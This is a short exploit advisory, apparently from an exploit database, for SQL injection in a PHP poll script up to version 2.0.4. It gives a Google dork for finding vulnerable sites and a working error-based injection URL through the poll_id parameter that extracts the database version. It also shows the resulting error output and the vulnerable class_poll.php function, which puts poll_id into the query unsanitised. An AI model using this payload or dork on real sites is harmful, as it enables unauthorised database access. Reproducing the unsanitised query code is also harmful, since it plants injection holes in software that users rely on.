# Date: 31.12.2011
# Author: Ereee
# Version: <=2.0.4
# Category:: [remote, webapps]
# Google dork: inurl:"popup.php?action=results"
# Tested in: web

Query:
http://localhost/poll/demo_3.php?poll_id=1+or+1+group+by+concat_ws(0x3a, version(),rand(0)|0)+having+min(0)--+f
Result:
Error Number: 1062 Duplicate entry &#039;5.0.77:1&#039; for key &#039;group_key&#039;

Vulnerable code in class_poll.php
########################################
function is_valid_poll_id($poll_id) {
if ($poll_id>0) {
$this->db->fetch_array($this->db->query("SELECT poll_id FROM ".$this->tbl[&#039;poll_index&#039;]." WHERE poll_id=$poll_id AND status<&#039;2&#039;"));
return ($this->db->record[&#039;poll_id&#039;]) ? true : false;
} else {
return false;
}
}
########################################

Greetz to : forum.antichat.ru&rdot.org members



